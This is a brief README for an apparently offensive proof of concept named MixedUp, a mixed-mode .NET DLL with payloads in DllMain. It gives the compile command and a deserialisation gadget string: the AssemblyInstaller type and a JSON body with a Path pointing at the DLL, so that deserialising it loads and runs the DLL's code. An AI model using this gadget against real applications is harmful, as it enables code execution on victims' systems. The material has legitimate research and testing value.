# MixedUp
Mixed Mode Assembly PoC with sample payloads in DLLMain

## Compile

`cl /clr /LD MixedAssembly.cpp -o MixedAssembly64.dll`

## Calling

### Deserialisation example

Type: `'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'`

JSON: `'{"Path":"file:///c:/users/public/documents/MixedAssembly64.dll","CommandLine":["a","a"],"UseNewContext":false}'`

## To do

- Work out whether it is possible to accept commandline arguments
